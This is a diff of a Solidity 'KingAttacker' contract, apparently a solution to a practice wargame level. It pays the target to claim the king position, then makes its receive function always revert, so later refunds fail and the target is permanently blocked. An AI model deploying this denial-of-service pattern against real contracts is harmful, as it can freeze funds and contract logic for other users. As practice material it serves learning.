@@ -1,18 +1,19 @@
-pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.3;
 
 contract KingAttacker {
   address payable kingContract;
   bool protected = false;
 
-  event Log(address addr);
-
-  constructor(address payable _address) public payable {
+  constructor(address payable _address) payable {
     kingContract = _address;
-    kingContract.call{ value: address(this).balance }("");
+
+    (bool success, ) = payable(address(kingContract)).call{value: msg.value}("");
+    require(success, "external call failed");
   }
 
   receive() external payable {
-     kingContract.call{ value: address(this).balance }("");
+     revert();
   }
 
 }
